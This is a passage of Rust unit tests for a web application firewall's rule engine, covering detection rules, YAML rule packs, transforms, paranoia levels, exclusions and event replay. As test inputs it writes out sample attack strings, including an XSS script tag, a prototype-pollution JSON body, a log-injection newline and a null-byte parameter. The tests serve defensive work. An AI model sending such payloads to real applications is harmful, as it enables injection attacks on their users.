        assert_eq!(matches[0].rule_id, "SAUGRA-SC-001");
        assert_eq!(
            matches[0].owasp_category.as_deref(),
            Some("A03:2025-Software Supply Chain Failures")
        );
    }

    #[test]
    fn detects_insecure_forwarded_protocol() {
        let matches = inspect(&RequestParts {
            headers: "x-forwarded-proto: http",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-CRYPTO-001");
    }

    #[test]
    fn detects_method_override_design_risk() {
        let matches = inspect(&RequestParts {
            headers: "x-http-method-override: delete",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-DESIGN-001");
    }

    #[test]
    fn detects_auth_secret_in_url() {
        let matches = inspect(&RequestParts {
            query: "password=secret",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-AUTH-002");
    }

    #[test]
    fn detects_integrity_failure_payloads() {
        let matches = inspect(&RequestParts {
            body: r#"{"__proto__":{"admin":true}}"#,
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-INTEGRITY-001");
    }

    #[test]
    fn detects_log_injection_payloads() {
        let matches = inspect(&RequestParts {
            query: "name=alice%0aERROR status=500",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-LOG-001");
    }

    #[test]
    fn detects_exceptional_condition_payloads() {
        let matches = inspect(&RequestParts {
            query: "file=%00",
            ..RequestParts::default()
        })
        .unwrap();

        assert_eq!(matches[0].rule_id, "SAUGRA-EXC-001");
    }

    #[test]
    fn loads_rules_from_configured_yaml_file() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("custom-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-HEADER-001
    name: Local Header Rule
    category: local_policy
    severity: low
    targets:
      - headers
    pattern: "(?i)x-local-test:\\s*blocked"
    explanation: Local header policy matched.
"#,
        )
        .unwrap();

        let rule_set = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap();
        let matches = rule_set.inspect(&RequestParts {
            headers: "x-local-test: blocked",
            ..RequestParts::default()
        });

        assert_eq!(rule_set.rules().len(), 1);
        assert_eq!(matches[0].rule_id, "LOCAL-HEADER-001");
    }

    #[test]
    fn applies_transforms_as_ordered_pipeline() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("transform-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-TRANSFORM-001
    name: Ordered Transform Rule
    category: local_policy
    severity: low
    targets:
      - query
    transforms:
      - url_decode
      - plus_to_space
      - lowercase
    pattern: "hello world"
    explanation: Ordered transform pipeline matched.
"#,
        )
        .unwrap();

        let rule_set = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap();
        let matches = rule_set.inspect(&RequestParts {
            query: "q=HELLO+WORLD",
            ..RequestParts::default()
        });

        assert_eq!(matches[0].rule_id, "LOCAL-TRANSFORM-001");
        assert_eq!(
            rule_set.rules()[0].transforms,
            vec![
                RuleTransform::UrlDecode,
                RuleTransform::PlusToSpace,
                RuleTransform::Lowercase
            ]
        );
    }

    #[test]
    fn plus_to_space_only_changes_query_inputs() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("body-transform-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-BODY-001
    name: Body Transform Rule
    category: local_policy
    severity: low
    targets:
      - body
    transforms:
      - plus_to_space
    pattern: "hello world"
    explanation: Body transform rule matched.
"#,
        )
        .unwrap();

        let rule_set = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap();
        let matches = rule_set.inspect(&RequestParts {
            body: "hello+world",
            ..RequestParts::default()
        });

        assert!(matches.is_empty());
    }

    #[test]
    fn excludes_rule_by_id_path_and_query_param() {
        let rule_set = RuleSet {
            rules: builtin_rules().unwrap(),
        };
        let matches = rule_set.inspect_with_exclusions(
            &RequestParts {
                path: "/api/articles/preview",
                query: "content=<script>alert(1)</script>",
                ..RequestParts::default()
            },
            &[RuleExclusionConfig {
                rule_ids: vec!["SAUGRA-XSS-001".to_string()],
                path_prefixes: vec!["/api/articles".to_string()],
                query_params: vec!["content".to_string()],
                ..RuleExclusionConfig::default()
            }],
        );

        assert!(matches.is_empty());
    }

    #[test]
    fn does_not_exclude_rule_when_path_scope_does_not_match() {
        let rule_set = RuleSet {
            rules: builtin_rules().unwrap(),
        };
        let matches = rule_set.inspect_with_exclusions(
            &RequestParts {
                path: "/comments",
                query: "content=<script>alert(1)</script>",
                ..RequestParts::default()
            },
            &[RuleExclusionConfig {
                rule_ids: vec!["SAUGRA-XSS-001".to_string()],
                path_prefixes: vec!["/api/articles".to_string()],
                query_params: vec!["content".to_string()],
                ..RuleExclusionConfig::default()
            }],
        );

        assert_eq!(matches[0].rule_id, "SAUGRA-XSS-001");
    }

    #[test]
    fn excludes_rule_by_category_and_header_scope() {
        let rule_set = RuleSet {
            rules: builtin_rules().unwrap(),
        };
        let matches = rule_set.inspect_with_exclusions(
            &RequestParts {
                query: "content=<script>alert(1)</script>",
                headers: "x-trusted-editor: true",
                ..RequestParts::default()
            },
            &[RuleExclusionConfig {
                categories: vec!["cross_site_scripting".to_string()],
                headers: vec!["X-Trusted-Editor".to_string()],
                ..RuleExclusionConfig::default()
            }],
        );

        assert!(matches.is_empty());
    }

    #[test]
    fn context_aware_exclusion_requires_every_configured_scope() {
        let rule_set = RuleSet {
            rules: builtin_rules().unwrap(),
        };
        let exclusion = RuleExclusionConfig {
            rule_ids: vec!["SAUGRA-XSS-001".to_string()],
            methods: vec!["POST".to_string()],
            targets: vec![RuleTarget::Query],
            content_types: vec!["application/json".to_string()],
            trusted_headers: vec![crate::config::RuleExclusionHeaderValueConfig {
                name: "X-Deployment".to_string(),
                values: vec!["internal".to_string()],
            }],
            identities: vec![crate::config::RuleExclusionHeaderValueConfig {
                name: "X-Authenticated-Role".to_string(),
                values: vec!["editor".to_string()],
            }],
            ..RuleExclusionConfig::default()
        };
        let request = RequestParts {
            method: "POST",
            path: "/preview",
            query: "content=%3Cscript%3Ealert(1)%3C/script%3E",
            headers: "content-type: application/json\nx-deployment: internal\nx-authenticated-role: editor",
            content_type: "application/json; charset=utf-8",
            trusted_proxy: true,
            ..RequestParts::default()
        };

        assert!(rule_set
            .inspect_with_exclusions(&request, std::slice::from_ref(&exclusion))
            .is_empty());

        let untrusted_request = RequestParts {
            trusted_proxy: false,
            ..request
        };
        assert_eq!(
            rule_set
                .inspect_with_exclusions(&untrusted_request, &[exclusion])
                .len(),
            1
        );
    }

    #[test]
    fn replay_reports_exclusion_impact_from_retained_context() {
        let rule_set = RuleSet {
            rules: builtin_rules().unwrap(),
        };
        let event = SecurityEvent::new(
            "POST",
            "/preview",
            "content=%3Cscript%3Ealert(1)%3C/script%3E",
            WafDecision::from_matches("replay-exclusion".to_string(), WafMode::Monitor, vec![], 5),
        )
        .with_evidence(crate::event_store::RequestEvidence {
            content_type: "application/json".to_string(),
            body_size: 0,
            query_parameter_names: vec!["content".to_string()],
            header_names: vec!["content-type".to_string()],
        });
        let exclusions = vec![RuleExclusionConfig {
            rule_ids: vec!["SAUGRA-XSS-001".to_string()],
            methods: vec!["POST".to_string()],
            targets: vec![RuleTarget::Query],
            content_types: vec!["application/json".to_string()],
            query_params: vec!["content".to_string()],
            ..RuleExclusionConfig::default()
        }];

        let report = replay_events_with_exclusions(&rule_set, &[event], &exclusions);

        assert_eq!(report.matches_before_exclusions, 1);
        assert_eq!(report.matches_after_exclusions, 0);
        assert_eq!(report.excluded_events, 1);
    }

    #[test]
    fn rejects_invalid_regex_in_configured_rule_file() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("bad-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-BAD-001
    name: Bad Regex
    category: local_policy
    severity: low
    targets:
      - query
    pattern: "["
    explanation: Bad regex should fail startup.
"#,
        )
        .unwrap();

        let error = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap_err();

        assert!(matches!(error, RuleError::InvalidRegex { .. }));
    }

    #[test]
    fn filters_rules_above_configured_paranoia_level() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("paranoia-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-PL1-001
    name: PL1 Rule
    category: local_policy
    severity: low
    paranoia_level: 1
    targets:
      - query
    pattern: "pl1"
    explanation: PL1 rule matched.
  - id: LOCAL-PL2-001
    name: PL2 Rule
    category: local_policy
    severity: low
    paranoia_level: 2
    targets:
      - query
    pattern: "pl2"
    explanation: PL2 rule matched.
"#,
        )
        .unwrap();

        let rule_set = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            paranoia_level: 1,
            ..RuleSettings::default()
        })
        .unwrap();

        assert_eq!(rule_set.rules().len(), 1);
        assert_eq!(rule_set.rules()[0].id, "LOCAL-PL1-001");
    }

    #[test]
    fn loads_rules_up_to_detection_paranoia_level() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("detection-paranoia-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-PL1-001
    name: PL1 Rule
    category: local_policy
    severity: low
    paranoia_level: 1
    targets:
      - query
    pattern: "pl1"
    explanation: PL1 rule matched.
  - id: LOCAL-PL2-001
    name: PL2 Rule
    category: local_policy
    severity: low
    paranoia_level: 2
    targets:
      - query
    pattern: "pl2"
    explanation: PL2 rule matched.
"#,
        )
        .unwrap();

        let rule_set = load_rule_set(&RuleSettings {
            files: vec![rule_path],
            paranoia_level: 1,
            detection_paranoia_level: Some(2),
            blocking_paranoia_level: Some(1),
            ..RuleSettings::default()
        })
        .unwrap();

        assert_eq!(rule_set.rules().len(), 2);
        assert_eq!(rule_set.rules()[1].id, "LOCAL-PL2-001");
    }

    #[test]
    fn validates_regexes_even_when_filtered_by_paranoia_level() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("bad-paranoia-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-PL1-001
    name: PL1 Rule
    category: local_policy
    severity: low
    paranoia_level: 1
    targets:
      - query
    pattern: "pl1"
    explanation: PL1 rule matched.
  - id: LOCAL-PL2-BAD-001
    name: Bad PL2 Rule
    category: local_policy
    severity: low
    paranoia_level: 2
    targets:
      - query
    pattern: "["
    explanation: Bad regex should fail even when PL2 is inactive.
"#,
        )
        .unwrap();

        let error = load_rule_set_with_report(&RuleSettings {
            files: vec![rule_path],
            paranoia_level: 1,
            ..RuleSettings::default()
        })
        .unwrap_err();

        assert!(matches!(error, RuleError::InvalidRegex { .. }));
    }

    #[test]
    fn reports_rule_pack_loading_counts() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("reported-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-PL1-001
    name: PL1 Rule
    category: local_policy
    severity: low
    paranoia_level: 1
    targets:
      - query
      - body
    pattern: "pl1"
    explanation: PL1 rule matched.
  - id: LOCAL-PL2-001
    name: PL2 Rule
    category: local_policy
    severity: low
    paranoia_level: 2
    targets:
      - query
    pattern: "pl2"
    explanation: PL2 rule matched.
  - id: LOCAL-DISABLED-001
    name: Disabled Rule
    category: local_policy
    severity: low
    enabled: false
    targets:
      - query
    pattern: "disabled"
    explanation: Disabled rule should not load.
"#,
        )
        .unwrap();

        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
            files: vec![rule_path.clone()],
            paranoia_level: 1,
            ..RuleSettings::default()
        })
        .unwrap();

        assert_eq!(report.files.len(), 1);
        assert_eq!(report.total_entries, 3);
        assert_eq!(report.enabled_entries, 2);
        assert_eq!(report.disabled_entries, 1);
        assert_eq!(report.compiled_rules, 3);
        assert_eq!(report.active_rules, 2);
        assert_eq!(report.transform_pipelines, 0);
        assert_eq!(report.filtered_by_paranoia, 1);
        assert_eq!(report.files[0].path, rule_path.display().to_string());
    }

    #[test]
    fn reports_rule_exclusion_scope() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("one-rule.yml");
        std::fs::write(
            &rule_path,
            r#"
rules:
  - id: LOCAL-001
    name: Local Rule
    category: local_policy
    severity: low
    targets:
      - query
    pattern: "local"
    explanation: Local rule matched.
"#,
        )
        .unwrap();

        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
            files: vec![rule_path],
            exclusions: vec![
                RuleExclusionConfig {
                    rule_ids: vec!["LOCAL-001".to_string()],
                    ..RuleExclusionConfig::default()
                },
                RuleExclusionConfig {
                    categories: vec!["local_policy".to_string()],
                    path_prefixes: vec!["/health".to_string()],
                    ..RuleExclusionConfig::default()
                },
            ],
            ..RuleSettings::default()
        })
        .unwrap();

        assert_eq!(report.exclusions.configured, 2);
        assert_eq!(report.exclusions.global, 1);
        assert_eq!(report.exclusions.scoped, 1);
        assert_eq!(report.exclusions.disabled_rule_ids, vec!["LOCAL-001"]);
        assert_eq!(report.exclusions.disabled_categories, vec!["local_policy"]);
        assert!(report
            .warnings
            .iter()
            .any(|warning| warning.contains("is global")));
    }

    #[test]
    fn warns_for_unknown_rules_and_non_overlapping_exclusion_targets() {
        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
            exclusions: vec![
                RuleExclusionConfig {
                    rule_ids: vec!["DOES-NOT-EXIST".to_string()],
                    path_prefixes: vec!["/review".to_string()],
                    ..RuleExclusionConfig::default()
                },
                RuleExclusionConfig {
                    rule_ids: vec!["SAUGRA-XSS-001".to_string()],
                    targets: vec![RuleTarget::Body],
                    ..RuleExclusionConfig::default()
                },
            ],
            ..RuleSettings::default()
        })
        .unwrap();

        assert!(report
            .warnings
            .iter()
            .any(|warning| warning.contains("unknown or inactive rule ID")));
        assert!(report
            .warnings
            .iter()
            .any(|warning| warning.contains("targets do not overlap")));
    }

    #[test]
    fn reports_unsupported_imports_as_warnings() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("converted-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
metadata:
  name: converted-owasp-crs-rules
  version: generated
  standards:
    - owasp-crs-converted
unsupported_imports:
  - id: CRS-942100
    reason: unsupported operator @detectSQLi; only @rx is currently converted
rules:
  - id: LOCAL-001
    name: Local Rule
    category: local_policy
    severity: low
    targets:
      - query
    pattern: "local"
    explanation: Local rule matched.
"#,
        )
        .unwrap();

        let (_rule_set, report) = load_rule_set_with_report(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap();

        assert_eq!(report.files[0].unsupported_imports, 1);
        assert!(report.warnings[0].contains("CRS-942100"));
        assert!(report.warnings[0].contains("unsupported operator"));
    }

    #[test]
    fn rejects_blank_rule_pack_metadata() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("blank-metadata-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
metadata:
  name: ""
  version: 0.1.0
rules:
  - id: LOCAL-001
    name: Local Rule
    category: local_policy
    severity: low
    targets:
      - query
    pattern: "local"
    explanation: Local rule matched.
"#,
        )
        .unwrap();

        let error = load_rule_set_with_report(&RuleSettings {
            files: vec![rule_path],
            ..RuleSettings::default()
        })
        .unwrap_err();

        assert!(matches!(error, RuleError::InvalidMetadata { .. }));
    }

    #[test]
    fn validates_and_replays_a_draft_rule_pack_without_activating_it() {
        let temp_dir = tempfile::tempdir().unwrap();
        let rule_path = temp_dir.path().join("draft-rules.yml");
        std::fs::write(
            &rule_path,
            r#"
metadata:
  name: reviewed-draft
  version: draft-1
rules:
  - id: DRAFT-LOCAL-001
    name: Repeated Probe
    category: local_policy
    severity: medium
    targets:
      - query
      - body
    pattern: "(?i)needle"
    explanation: A reviewed repeated probe matched.
"#,
        )
        .unwrap();

        let (rule_set, report) = validate_rule_file(&rule_path, u8::MAX).unwrap();
        assert_eq!(report.entries, 1);
        assert_eq!(report.compiled_rules, 2);

        let prior_match = rule_set.inspect(&RequestParts {
            query: "probe=needle",
            ..RequestParts::default()
        });
        let events = vec![
            SecurityEvent::new(
                "GET",
                "/search",
                "probe=needle",
                WafDecision::from_matches("allowed".to_string(), WafMode::Monitor, Vec::new(), 5),
            ),
            SecurityEvent::new(
                "GET",
                "/search",
                "safe=1",
                WafDecision::from_matches(
                    "monitored".to_string(),
                    WafMode::Monitor,
                    prior_match.clone(),
                    5,
                ),
            ),
            SecurityEvent::new(
                "GET",
                "/search",
                "probe=needle",
                WafDecision::from_matches("blocked".to_string(), WafMode::Block, prior_match, 3),
            ),
        ];

        let replay = replay_events(&rule_set, &events);

        assert_eq!(replay.total_events, 3);
        assert_eq!(replay.matched_events, 2);
        assert_eq!(replay.previously_allowed_review_candidates, 1);
        assert_eq!(replay.previously_blocked_matches, 1);
        assert_eq!(replay.prior_rule_detection_events, 2);
        assert_eq!(replay.prior_rule_detection_overlap, 1);
        assert_eq!(replay.rule_match_counts["DRAFT-LOCAL-001"], 2);
        assert_eq!(replay.replayed_targets, vec!["query"]);
        assert_eq!(replay.unavailable_targets, vec!["body"]);
    }
}
